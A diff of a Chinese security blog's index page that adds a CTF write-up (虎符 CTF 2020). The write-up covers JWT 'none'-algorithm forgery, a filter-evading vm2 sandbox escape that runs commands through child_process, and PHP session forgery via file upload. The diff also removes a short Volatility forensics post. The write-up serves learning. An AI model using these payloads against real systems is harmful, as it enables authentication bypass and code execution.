@@ -207,6 +207,558 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5702afe7e.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d5702afe7e.html" class="post-title-link" itemprop="url">虎符 CTF 2020 Write up</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-20 12:27:54" itemprop="dateCreated datePublished" datetime="2020-04-20T12:27:54+08:00">2020-04-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:15:06" itemprop="dateModified" datetime="2020-10-14T17:15:06+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>13k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>11 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h1><p><code>/static/js/app.js</code>中有hint提示这个web使用<code>koa-static 来处理静态文件</code></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873489757041.png" alt="img"></p>
+<p>猜测存在koa路由配置错误导致根目录的任意文件读取。我们直接读取app.jpg</p>
+<pre><code class="http">http://dafd014be0114c23bd9aa2e1a84d01ea772d377a8e974ab5.changame.ichunqiu.com/app.js</code></pre>
+<pre><code class="javascript">const Koa = require(&#39;koa&#39;);
+const bodyParser = require(&#39;koa-bodyparser&#39;);
+const session = require(&#39;koa-session&#39;);
+const static = require(&#39;koa-static&#39;);
+const views = require(&#39;koa-views&#39;);
+
+const crypto = require(&#39;crypto&#39;);
+const { resolve } = require(&#39;path&#39;);
+
+const rest = require(&#39;./rest&#39;);
+const controller = require(&#39;./controller&#39;);
+
+const PORT = 80;
+const app = new Koa();
+
+app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];
+global.secrets = [];
+
+app.use(static(resolve(__dirname, &#39;.&#39;)));
+
+app.use(views(resolve(__dirname, &#39;./views&#39;), {
+  extension: &#39;pug&#39;
+}));
+
+app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));
+
+// parse request body:
+app.use(bodyParser());
+
+// prepare restful service
+app.use(rest.restify());
+
+// add controllers:
+app.use(controller());
+
+app.listen(PORT);
+console.log(`app started at port ${PORT}...`);
+</code></pre>
+<p>根据代码我们知道还有<code>rest.js</code>和<code>controller.js</code></p>
+<pre><code class="javascript">module.exports = {
+    APIError: function (code, message) {
+        this.code = code || &#39;internal:unknown_error&#39;;
+        this.message = message || &#39;&#39;;
+    },
+    restify: () =&gt; {
+        const pathPrefix = &#39;/api/&#39;;
+        return async (ctx, next) =&gt; {
+            if (ctx.request.path.startsWith(pathPrefix)) {
+                ctx.rest = data =&gt; {
+                    ctx.response.type = &#39;application/json&#39;;
+                    ctx.response.body = data;
+                };
+                try {
+                    await next();
+                } catch (e) {
+                    ctx.response.status = 400;
+                    ctx.response.type = &#39;application/json&#39;;
+                    ctx.response.body = {
+                        code: e.code || &#39;internal_error&#39;,
+                        message: e.message || &#39;&#39;
+                    };
+                }
+            } else {
+                await next();
+            }
+        };
+    }
+};
+</code></pre>
+<pre><code class="javascript">const fs = require(&#39;fs&#39;);
+
+function addMapping(router, mapping) {
+    for (const url in mapping) {
+        if (url.startsWith(&#39;GET &#39;)) {
+            const path = url.substring(4);
+            router.get(path, mapping[url]);
+        } else if (url.startsWith(&#39;POST &#39;)) {
+            const path = url.substring(5);
+            router.post(path, mapping[url]);
+        } else {
+            console.log(`invalid URL: ${url}`);
+        }
+    }
+}
+
+function addControllers(router, dir) {
+    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {
+        return f.endsWith(&#39;.js&#39;);
+    }).forEach(f =&gt; {
+        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);
+        addMapping(router, mapping);
+    });
+}
+
+module.exports = (dir) =&gt; {
+    const controllers_dir = dir || &#39;controllers&#39;;
+    const router = require(&#39;koa-router&#39;)();
+    addControllers(router, controllers_dir);
+    return router.routes();
+};
+</code></pre>
+<p>可以看到<code>controllers</code>应该还还存在<code>api.js</code></p>
+<pre><code class="javascript">const crypto = require(&#39;crypto&#39;);
+const fs = require(&#39;fs&#39;)
+const jwt = require(&#39;jsonwebtoken&#39;)
+
+const APIError = require(&#39;../rest&#39;).APIError;
+
+module.exports = {
+    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {
+        const {username, password} = ctx.request.body;
+
+        if(!username || username === &#39;admin&#39;){
+            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
+        }
+
+        if(global.secrets.length &gt; 100000) {
+            global.secrets = [];
+        }
+
+        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
+        const secretid = global.secrets.length;
+        global.secrets.push(secret)
+
+        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});
+
+        ctx.rest({
+            token: token
+        });
+
+        await next();
+    },
+
+    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {
+        const {username, password} = ctx.request.body;
+
+        if(!username || !password) {
+            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
+        }
+
+        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;
+
+        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
+
+        console.log(sid)
+
+        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
+            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
+        }
+
+        const secret = global.secrets[sid];
+
+        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});
+
+        const status = username === user.username &amp;&amp; password === user.password;
+
+        if(status) {
+            ctx.session.username = username;
+        }
+
+        ctx.rest({
+            status
+        });
+
+        await next();
+    },
+
+    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {
+        if(ctx.session.username !== &#39;admin&#39;){
+            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
+        }
+
+        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
+        ctx.rest({
+            flag
+        });
+
+        await next();
+    },
+
+    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {
+        ctx.session.username = null;
+        ctx.rest({
+            status: true
+        })
+        await next();
+    }
+};
+</code></pre>
+<p>这道题其实是原题，jwt伪造问题和[AngstromCTF 2019]Cookie Cutter一样。</p>
+<p>首先我们来了解一下JWT的构成：</p>
+<p>JWT例子：</p>
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJyb2xsZWQiOiJubyIsImlhdCI6MTU4NzM1MTY0MX0.ljkr86K_y88GP8_9RBzxB2H8CBEK73tNdfDQwmT2eaY</code></pre><p>其实它是以点为界分为三部分。</p>
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code></pre><pre><code>eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJyb2xsZWQiOiJubyIsImlhdCI6MTU4NzM1MTY0MX0</code></pre><pre><code>ljkr86K_y88GP8_9RBzxB2H8CBEK73tNdfDQwmT2eaY</code></pre><p>第一部分我们成为头部、第二部分我们称为payload,第二部分我们称之为签证。</p>
+<ul>
+<li>头部构成主要由两部分，typ声明类型，alg声明加密类型，最后base64编码：</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873521703081.png" alt="img"></p>
+<ul>
+<li>payload</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873528037874.png" alt="img"></p>
+<ul>
+<li>签证由三部分组成<ul>
+<li>头（header）basee64</li>
+<li>payload  base64</li>
+<li>secret</li>
+</ul>
+</li>
+<li>签证拿到上述东西后通过header中加密方式加盐的方式加密形成了签证。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873532192819.png" alt="img"></p>
+<p>了解JWT的组成后，我们总结JWT可能存在如下的安全问题：</p>
+<blockquote>
+<p>1.修改头什么的算法为none</p>
+<p>2.若secret较短可以直接使用<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a></p>
+<p>3.秘钥泄露</p>
+<p>3.修改算法RS256为HS256</p>
+</blockquote>
+<p>在这道题中明显是修改算法为none进行绕过</p>
+<p>构造jwt编写脚本</p>
+<pre><code class="javascript">
+const crypto = require(&#39;crypto&#39;);
+const jwt = require(&#39;jsonwebtoken&#39;);
+
+secretid=0.5;
+username=&quot;admin&quot;;
+password=&quot;admin&quot;;
+rolled=&quot;no&quot;
+const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
+const token = jwt.sign({secretid, username, password,rolled}, secret, {algorithm: &#39;none&#39;});
+console.log(token);
+const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString());
+console.log(sid)
+</code></pre>
+<p>这里绕过需要有一个小trick，先注册一个账号然后再提交上面生成的JWT。SID绕过可以是””或者大于零小于1的数。这是为什么呢。</p>
+<p>​        首先要绕过<code>sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0</code>j就不能让<code>global.secrets</code>这个数组为<code>undefined</code>，我们需要注册一个账号是的其初始化。</p>
+<p>​        其次为什么小于1大于零0呢，我们需要一个<code>global.secrets</code>的值为null,但是如果是0的话就是我们注册那个了，这样的话就会提示需要签名，如果是大于1小于零正好可以绕过第一层检测并且使得值为null。当然如果你注册的账号够多大于1也是可以的。还有就是可以使用空字符串进行绕过，空数组也行，因为nodejs中弱类型比较的关系这个会在下一个文章中重点研究。</p>
+<p>最终获得flag:</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873550195855.png" alt="img"></p>
+<h1 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h1><p>原题nodejs沙箱逃逸，但是对许多函数进行了过滤。</p>
+<p>和题中一个操作在issue中一样我们找最新的版本的<a href="https://github.com/patriksimek/vm2/issues/225。" target="_blank" rel="noopener">exp</a>来测试。</p>
+<pre><code>(function(){
+    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
+    try{
+        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
+    }catch(e){
+        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();
+    }
+})()</code></pre><p>但是自己打进去会发现是不行的。我们可以fuzz这个payload有哪些内容是被过滤的。process, exec, eval, constructor, prototype, Function, 加号, 双引号, 单引号被过滤.这里我们可以用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">模板字符串</a>进行绕过，而属性可以用[模板字符串]代替，而单引号双引号可以用反引号代替。</p>
+<pre><code>`${`${`return proces`}s`}`</code></pre><p>最后修改得：</p>
+<pre><code class="javascript">(function(){
+       TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
+    try{
+         Object.preventExtensions(Buffer.from(``)).a = 1;
+    }catch(e){
+        return e[`${`${`get_proces`}s`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`whoami`).toString();
+    }
+})()</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873745251856.png" alt="img"></p>
+<h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><p>题目直接给了源码：</p>
+<pre><code class="php"> &lt;?php
+error_reporting(0);
+session_save_path(&quot;/var/babyctf/&quot;);
+session_start();
+require_once &quot;/flag&quot;;
+highlight_file(__FILE__);
+if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
+{
+    $filename=&#39;/var/babyctf/success.txt&#39;;
+    if(file_exists($filename)){
+            safe_delete($filename);
+            die($flag);
+    }
+}
+else{
+    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
+}
+$direction = filter_input(INPUT_POST, &#39;direction&#39;);
+$attr = filter_input(INPUT_POST, &#39;attr&#39;);
+$dir_path = &quot;/var/babyctf/&quot;.$attr;
+if($attr===&quot;private&quot;){
+    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
+}
+if($direction === &quot;upload&quot;){
+    try{
+        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
+            throw new RuntimeException(&#39;invalid upload&#39;);
+        }
+        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
+        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
+        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
+            throw new RuntimeException(&#39;invalid file path&#39;);
+        }
+        @mkdir($dir_path, 0700, TRUE);
+        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
+            $upload_result = &quot;uploaded&quot;;
+        }else{
+            throw new RuntimeException(&#39;error while saving&#39;);
+        }
+    } catch (RuntimeException $e) {
+        $upload_result = $e-&gt;getMessage();
+    }
+} elseif ($direction === &quot;download&quot;) {
+    try{
+        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
+        $file_path = $dir_path.&quot;/&quot;.$filename;
+        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
+            throw new RuntimeException(&#39;invalid file path&#39;);
+        }
+        if(!file_exists($file_path)) {
+            throw new RuntimeException(&#39;file not exist&#39;);
+        }
+        header(&#39;Content-Type: application/force-download&#39;);
+        header(&#39;Content-Length: &#39;.filesize($file_path));
+        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
+        if(readfile($file_path)){
+            $download_result = &quot;downloaded&quot;;
+        }else{
+            throw new RuntimeException(&#39;error while saving&#39;);
+        }
+    } catch (RuntimeException $e) {
+        $download_result = $e-&gt;getMessage();
+    }
+    exit;
+}
+?&gt;</code></pre>
+<p>我们直接来看如何能拿到flag；代码中可以看到，首先我们<code>session</code>必须得是<code>admin</code>其次必须存在success.txt</p>
+<pre><code class="php">if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
+{
+    $filename=&#39;/var/babyctf/success.txt&#39;;
+    if(file_exists($filename)){
+            safe_delete($filename);
+            die($flag);
+    }
+}
+else{
+    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
+}</code></pre>
+<p>我们再看第二部分上传的代码,这里有四个重要参数，</p>
+<ul>
+<li><p><code>direction=upload</code></p>
+</li>
+<li><p><code>attr</code> 可以对上传路径产生影响</p>
+</li>
+<li><p>上传的 field是up_file</p>
+</li>
+<li><p>最后一点是上传文件名会拼接上文件内容本身的sha256，即</p>
+</li>
+</ul>
+<blockquote>
+<p>$file_path .= “_”.hash_file(“sha256”,$_FILES[‘up_file’][‘tmp_name’]);</p>
+</blockquote>
+<p>同时这里已经锁死目录在<code>/var/babyctf/</code>,代码已经对目录是否穿越进行了检查。而这个上传的目录正好又是我们session的存储位置代码开头就设置了session存储目录</p>
+<blockquote>
+<p>session_save_path(“/var/babyctf/“);</p>
+</blockquote>
+<p>那我们能不能上传一个session对session进行修改呢？我们看他会将文件本身的名字拼接<code>_sha256(file)</code>,那么我们计算出这个sha256把上传文件名改为sess不就变成一个session文件了。我们再修改cookie就能达到getflag的目的。</p>
+<pre><code class="php">$direction = filter_input(INPUT_POST, &#39;direction&#39;);
+$attr = filter_input(INPUT_POST, &#39;attr&#39;);
+$dir_path = &quot;/var/babyctf/&quot;.$attr;
+if($attr===&quot;private&quot;){
+    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
+}
+if($direction === &quot;upload&quot;){
+    try{
+        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
+            throw new RuntimeException(&#39;invalid upload&#39;);
+        }
+        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
+        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
+        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
+            throw new RuntimeException(&#39;invalid file path&#39;);
+        }
+        @mkdir($dir_path, 0700, TRUE);
+        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
+            $upload_result = &quot;uploaded&quot;;
+        }else{
+            throw new RuntimeException(&#39;error while saving&#39;);
+        }
+    } catch (RuntimeException $e) {
+        $upload_result = $e-&gt;getMessage();
+    }
+}</code></pre>
+<p>我们再看最后一部分下载的代码,这段代码很简单，直接direction=download并且post一个filename上去就能下载。这里我们可以直接读取当前session看看这个session是什么类型。</p>
+<pre><code class="php"> elseif ($direction === &quot;download&quot;) {
+    try{
+        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
+        $file_path = $dir_path.&quot;/&quot;.$filename;
+        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
+            throw new RuntimeException(&#39;invalid file path&#39;);
+        }
+        if(!file_exists($file_path)) {
+            throw new RuntimeException(&#39;file not exist&#39;);
+        }
+        header(&#39;Content-Type: application/force-download&#39;);
+        header(&#39;Content-Length: &#39;.filesize($file_path));
+        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
+        if(readfile($file_path)){
+            $download_result = &quot;downloaded&quot;;
+        }else{
+            throw new RuntimeException(&#39;error while saving&#39;);
+        }
+    } catch (RuntimeException $e) {
+        $download_result = $e-&gt;getMessage();
+    }
+    exit;
+}</code></pre>
+<p>可以看到，这个session是php_binary类型</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874019524378.png" alt="img"></p>
+<table>
+<thead>
+<tr>
+<th>处理器名称</th>
+<th>存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php</td>
+<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_serialize</td>
+<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
+</tr>
+</tbody></table>
+<p>那么我们据此生成一个session文件</p>
+<pre><code class="php">&lt;?php
+
+ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);
+session_save_path(&quot;C:\\Users\\51763\\Desktop\\&quot;);
+session_start();
+
+$_SESSION[&#39;username&#39;] = &#39;admin&#39;;
+?&gt;</code></pre>
+<p>我们构造表单去上传这个文件,上传时候注意文件名改成<code>sess</code></p>
+<pre><code class="html">&lt;html&gt;
+&lt;body&gt;
+
+&lt;form action=&quot;http://fd32890b-1f94-4728-9e56-1261066852d8.node3.buuoj.cn/&quot; method=&quot;post&quot;
+enctype=&quot;multipart/form-data&quot;&gt;
+&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;direction&quot; value=&quot;upload&quot; /&gt; 
+&lt;input type=&quot;hidden&quot; name=&quot;attr&quot; value=&quot;success.txt&quot; /&gt; 
+&lt;input type=&quot;file&quot; name=&quot;up_file&quot; id=&quot;file&quot; /&gt; 
+&lt;br /&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>我们计算这个文件的sha256值是:432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874022155480.png" alt="img"></p>
+<p>我们再读取文件看看，是否上传成功。上传成功后将arr参数改成success.txt再上传一次，因为file_exists($filename)检测的是文件或文件夹是否存在，这我们只要建一个文件夹即可。</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874023458299.png" alt="img"></p>
+<p>直接修改<code>PHPSESSID=432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code> 直接出来flag</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874024375148.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d6b507308d.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1982,112 +2534,6 @@ public function dlfile($file_url, $save_to)
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d7cc8e3b98.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d7cc8e3b98.html" class="post-title-link" itemprop="url">Volatility内存取证学习-复盘红帽杯Advertising for Marriage</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-11-14 22:17:16" itemprop="dateCreated datePublished" datetime="2019-11-14T22:17:16+08:00">2019-11-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:17:06" itemprop="dateModified" datetime="2020-10-14T17:17:06+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>458</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="获取镜像信息"><a href="#获取镜像信息" class="headerlink" title="获取镜像信息"></a>获取镜像信息</h1><pre><code class="shell">volatility -f &lt;file&gt; imageinfo</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738160914043.png" alt="img"></p>
-<h1 id="读取进程"><a href="#读取进程" class="headerlink" title="读取进程"></a>读取进程</h1><pre><code class="shell">volatility -f &lt;file&gt; --profile=WinXPSP2x86 psscan</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738161931286.png" alt="img"></p>
-<h1 id="读取指定进程内容"><a href="#读取指定进程内容" class="headerlink" title="读取指定进程内容"></a>读取指定进程内容</h1><pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86 memdump -p 332 --dump-dir=./</code></pre>
-<pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86 notepad</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738164635401.png" alt="img"></p>
-<ul>
-<li><p>提取出来的文件用gimp打开调整宽度直至出现图像</p>
-</li>
-<li><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738341787357.png" alt="img"></p>
-</li>
-<li><p>综合得到提示</p>
-<pre><code>b1cxneedmoneyandgirlfirend</code></pre></li>
-</ul>
-<h1 id="搜索图片"><a href="#搜索图片" class="headerlink" title="搜索图片"></a>搜索图片</h1><pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86  filescan | grep -E &#39;jpg|png|jpeg|bmp|gif&#39;</code></pre>
-<h1 id="提取图片"><a href="#提取图片" class="headerlink" title="提取图片"></a>提取图片</h1><pre><code>volatility -f 1.raw --profile=WinXPSP2x86 dumpfiles -Q 0x000000000249ae78  -n --dump-dir=./</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738343277555.png" alt="img"></p>
-<h1 id="lsb解码、base64、维吉尼亚密码"><a href="#lsb解码、base64、维吉尼亚密码" class="headerlink" title="lsb解码、base64、维吉尼亚密码"></a>lsb解码、base64、维吉尼亚密码</h1><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738780599940.jpg" alt="img"></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738780779999.jpg" alt="img"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2159,7 +2605,7 @@ public function dlfile($file_url, $save_to)
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-count">65</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2172,7 +2618,7 @@ public function dlfile($file_url, $save_to)
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -2230,12 +2676,12 @@ public function dlfile($file_url, $save_to)
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">231k</span>
+    <span title="站点总字数">235k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:30</span>
+    <span title="站点阅读时长">3:33</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
